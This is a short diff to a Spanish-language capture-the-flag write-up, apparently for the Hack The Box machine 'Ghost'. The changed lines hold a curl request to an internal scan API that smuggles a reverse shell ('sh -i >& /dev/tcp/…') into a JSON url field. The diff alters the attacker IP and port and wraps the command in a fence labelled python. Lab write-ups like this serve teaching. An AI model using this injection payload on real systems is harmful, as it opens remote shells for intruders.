@@ -416,4 +416,7 @@ Parece que tenemos un usuario root web en el back-end. Ahora podemos preparar nu
   
 Sin embargo, parece que la máquina no tiene el comando bash, por lo que intentaremos con sh en cambio
 
-curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"https://4xura.com; sh -i >& /dev/tcp/10.10.16.2/4444 0>&1"}' | jq
+```python
+curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"https://4xura.com; sh -i >& /dev/tcp/10.10.14.73/9001 0>&1"}' | jq
+```
+
